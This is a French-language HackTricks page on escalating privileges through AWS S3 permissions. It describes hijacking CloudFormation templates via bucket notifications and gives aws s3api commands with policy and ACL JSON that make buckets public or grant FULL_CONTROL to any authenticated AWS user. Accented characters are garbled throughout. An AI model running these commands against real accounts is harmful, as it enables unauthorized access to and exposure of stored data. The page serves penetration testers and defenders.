# AWS - Privil√®ge d'escalade S3

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## S3

### `s3:PutBucketNotification`, `s3:PutObject`, `s3:GetObject`

Un attaquant ayant ces autorisations sur des buckets int√©ressants pourrait √™tre en mesure de pirater des ressources et d'escalader les privil√®ges.

Par exemple, un attaquant ayant ces **autorisations sur un bucket cloudformation** appel√© "cf-templates-nohnwfax6a6i-us-east-1" sera en mesure de pirater le d√©ploiement. L'acc√®s peut √™tre donn√© avec la politique suivante :

```json
{
    "Version":"2012-10-17",
    "Statement":[
        {
            "Effect":"Allow",
            "Action":[
                "s3:PutBucketNotification",
                "s3:GetBucketNotification",
                "s3:PutObject",
                "s3:GetObject"],
            "Resource":[
                "arn:aws:s3:::cf-templates-*\/*",
                "arn:aws:s3:::cf-templates-*"]
        },
        {
            "Effect":"Allow",
            "Action":"s3:ListAllMyBuckets",
            "Resource":"*"
        }]
    }
```

Et le piratage est possible car il y a une **petite fen√™tre de temps entre le moment o√π le mod√®le est t√©l√©charg√©** sur le bucket et le moment o√π le **mod√®le est d√©ploy√©**. Un attaquant pourrait simplement cr√©er une **fonction lambda** dans son compte qui sera **d√©clench√©e lorsqu'une notification de bucket est envoy√©e**, et **pirate** le **contenu** de ce **bucket**.

![](<../../../.gitbook/assets/image (18) (1) (1).png>)

Le module Pacu [`cfn__resouce_injection`](https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#cfn\_\_resource\_injection) peut √™tre utilis√© pour automatiser cette attaque.\
Pour plus d'informations, consultez la recherche originale : [https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/](https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/)

### `s3:PutObject`, `s3:GetObject` <a href="#s3putobject-s3getobject" id="s3putobject-s3getobject"></a>

Ce sont les autorisations pour **obtenir et t√©l√©charger des objets sur S3**. Plusieurs services √† l'int√©rieur d'AWS (et √† l'ext√©rieur) utilisent le stockage S3 pour stocker des **fichiers de configuration**.\
Un attaquant ayant un **acc√®s en lecture** √† ceux-ci pourrait trouver des **informations sensibles** sur eux.\
Un attaquant ayant un **acc√®s en √©criture** √† ceux-ci pourrait **modifier les donn√©es pour abuser d'un service et essayer d'escalader les privil√®ges**.\
Voici quelques exemples :

* Si une instance EC2 stocke les **donn√©es utilisateur dans un bucket S3**, un attaquant pourrait le modifier pour **ex√©cuter du code arbitraire √† l'int√©rieur de l'instance EC2**.

### `s3:PutBucketPolicy`

Un attaquant, qui doit √™tre **du m√™me compte**, sinon l'erreur `The specified method is not allowed will trigger`, avec cette autorisation sera en mesure de se donner lui-m√™me plus de permissions sur le(s) bucket(s) en lui permettant de lire, √©crire, modifier, supprimer et exposer des buckets.

```bash
# Mettre √† jour la politique du bucket
aws s3api put-bucket-policy --policy file:///root/policy.json --bucket <bucket-name>
## Exemple de politique JSON
{
  "Id": "Policy1568185116930",
  "Version": "2012-10-17",
  "Statement": [
  {
      "Sid": "Stmt1568184932403",
      "Action": [
        "s3:ListBucket"
      ],
      "Effect": "Allow",
      "Resource": "arn:aws:s3:::welcome",
      "Principal": "*"
  },
  {
    "Sid": "Stmt1568185007451",
    "Action": [
      "s3:GetObject"
    ],
    "Effect": "Allow",
    "Resource": "arn:aws:s3:::welcome/*",
    "Principal": "*"
  }
  ]
}
```

### `s3:GetBucketAcl`, `s3:PutBucketAcl`

Un attaquant pourrait abuser de ces autorisations pour **lui accorder plus d'acc√®s** sur des buckets sp√©cifiques.\
Notez que l'attaquant n'a pas besoin d'√™tre du m√™me compte. De plus, l'acc√®s en √©criture

```bash
# Mettre √† jour l'ACL du bucket
aws s3api get-bucket-acl --bucket <bucket-name>
aws s3api put-bucket-acl --bucket <bucket-name> --access-control-policy file://acl.json

## Exemple d'ACL JSON
## Assurez-vous de modifier le nom d'affichage et l'ID du propri√©taire en fonction de l'ACL d'objet que vous avez r√©cup√©r√©e.
{
  "Owner": {
    "DisplayName": "<DisplayName>",
    "ID": "<ID>"
  },
  "Grants": [
  {
    "Grantee": {
      "Type": "Group",
      "URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
    },
  "Permission": "FULL_CONTROL"
  }
  ]
}
## Une ACL devrait vous donner la permission WRITE_ACP pour pouvoir mettre une nouvelle ACL
```

### `s3:GetObjectAcl`, `s3:PutObjectAcl`

Un attaquant pourrait abuser de ces autorisations pour lui accorder plus d'acc√®s sur des objets sp√©cifiques √† l'int√©rieur des buckets.

```bash
# Mettre √† jour l'ACL de l'objet du bucket
aws s3api get-object-acl --bucket <bucekt-name> --key flag 
aws s3api put-object-acl --bucket <bucket-name> --key flag --access-control-policy file://objacl.json

## Exemple d'ACL JSON
## Assurez-vous de modifier le nom d'affichage et l'ID du propri√©taire en fonction de l'ACL d'objet que vous avez r√©cup√©r√©e.
{
  "Owner": {
    "DisplayName": "<DisplayName>",
    "ID": "<ID>"
  },
  "Grants": [
  {
    "Grantee": {
      "Type": "Group",
      "URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
    },
  "Permission": "FULL_CONTROL"
  }
  ]
}
## Une ACL devrait vous donner la permission WRITE_ACP pour pouvoir mettre une nouvelle ACL
```

### `s3:GetObjectAcl`, `s3:PutObjectVersionAcl`

Un attaquant avec ces privil√®ges devrait √™tre en mesure de mettre une Acl √† une version d'objet sp√©cifique

```bash
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --version-id <value> --access-control-policy file://objacl.json
``